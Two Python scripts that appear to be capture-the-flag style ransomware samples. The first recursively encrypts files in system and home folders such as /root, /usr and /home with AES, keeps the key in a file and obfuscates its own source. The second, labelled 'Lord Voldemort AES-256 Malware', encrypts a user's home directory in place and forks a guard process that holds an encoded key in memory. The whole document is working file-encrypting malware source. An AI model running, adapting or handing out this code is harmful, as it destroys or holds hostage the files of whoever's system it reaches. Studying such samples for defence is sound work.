import os
import sys
import base64
import random
import string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.backends import default_backend
from multiprocessing import Process

def generate_key():
    salt = os.urandom(16)
    password = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password)
    return key, salt, password

def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    padder = PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    with open(file_path, "wb") as f:
        f.write(iv + encrypted_data)

def process_files(directories, excluded_files, key):
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if file not in excluded_files:
                        encrypt_file(os.path.join(root, file), key)

def hide_key_file(key_file_path):
    while True:
        pass

def reverse_and_obfuscate_script(script_path):
    with open(script_path, "r") as f:
        script = f.read()
    reversed_script = script[::-1]
    shuffled = list(reversed_script)
    random.shuffle(shuffled)
    index_map = {i: shuffled.index(char) for i, char in enumerate(reversed_script)}
    obfuscated_script = "".join(shuffled)
    encoded_script = base64.b64encode(obfuscated_script.encode()).decode()
    with open(script_path, "w") as f:
        f.write(encoded_script + "-f{" + ",".join(map(str, index_map.values())) + "}")

def main():
    key, salt, password = generate_key()
    key_file_path = "keyfile"
    excluded_files = ["boot", "shell-config", "proc-config", key_file_path, sys.argv[0]]
    target_folders = ["/root", "/usr", "/home", "/Documents", "/Downloads", "/var/gui"]
    
    with open(key_file_path, "wb") as f:
        f.write(key)
    
    parent_process = Process(target=hide_key_file, args=(key_file_path,))
    parent_process.start()
    
    process_files(target_folders, excluded_files, key)
    reverse_and_obfuscate_script(sys.argv[0])
    
    with open("/tmp/.flag.txt", "w") as f:
        f.write("Challenge Completed")

if __name__ == "__main__":
    main()



```
import os
import random
import base64
import base62
import signal
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

USER_DIR = "/home/skywalker-341"
KEY_PATH = "/dev/shm/.horcrux_key"
RESTORE_PATH = "/tmp/.horcrux"
ENC_KEY = b'VolDeMor'  # 64-bit = 8 bytes static encoding key

# Encrypt AES-256 key using ENC_KEY (64-bit)
def encrypt_key(aes_key):
    cipher = AES.new(pad(ENC_KEY, 16), AES.MODE_ECB)
    encrypted_key = cipher.encrypt(pad(aes_key, 32))
    return encrypted_key

def decrypt_key(encrypted_key):
    cipher = AES.new(pad(ENC_KEY, 16), AES.MODE_ECB)
    return unpad(cipher.decrypt(encrypted_key), 32)

# AES-256 file encryption
def encrypt_file(filepath, aes_key):
    cipher = AES.new(aes_key, AES.MODE_EAX)
    with open(filepath, 'rb') as f:
        plaintext = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    with open(filepath, 'wb') as f:
        f.write(cipher.nonce + tag + ciphertext)

# Encrypt all files in user directory
def encrypt_directory(base_path, key):
    for root, dirs, files in os.walk(base_path):
        for file in files:
            try:
                full_path = os.path.join(root, file)
                encrypt_file(full_path, key)
            except Exception as e:
                print(f"[-] Failed to encrypt {full_path}: {e}")

# "Horcrux" process watcher
def horcrux_process():
    def signal_handler(sig, frame):
        print("[!] Horcrux killed. Restoring encoded key...")
        with open(KEY_PATH, 'rb') as f:
            data = f.read()
        with open(RESTORE_PATH, 'wb') as f:
            f.write(data)
        print(f"[+] Key restored at {RESTORE_PATH}")
        os._exit(0)

    signal.signal(signal.SIGTERM, signal_handler)
    print("[+] Horcrux guarding encoded key. PID:", os.getpid())
    while True:
        time.sleep(1)

# Launch Horcrux process
def spawn_horcrux_guard(encoded_key):
    with open(KEY_PATH, 'wb') as f:
        f.write(encoded_key)

    pid = os.fork()
    if pid == 0:
        os.setsid()
        os.execlp("python3", "python3", __file__, "--horcrux")
    else:
        print(f"[+] Horcrux process spawned with PID {pid}")

# Entry
if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "--horcrux":
        horcrux_process()
        sys.exit(0)

    print("[*] Starting Lord Voldemort AES-256 Malware")

    # Generate 256-bit AES key
    aes_key = get_random_bytes(32)
    encoded_key = encrypt_key(aes_key)

    # Encrypt files in target directory
    encrypt_directory(USER_DIR, aes_key)

    # Store encoded AES key in RAM + protect with horcrux
    spawn_horcrux_guard(encoded_key)

    print("[+] Encryption done. Horcrux holds the key... in the void 🧠")




```
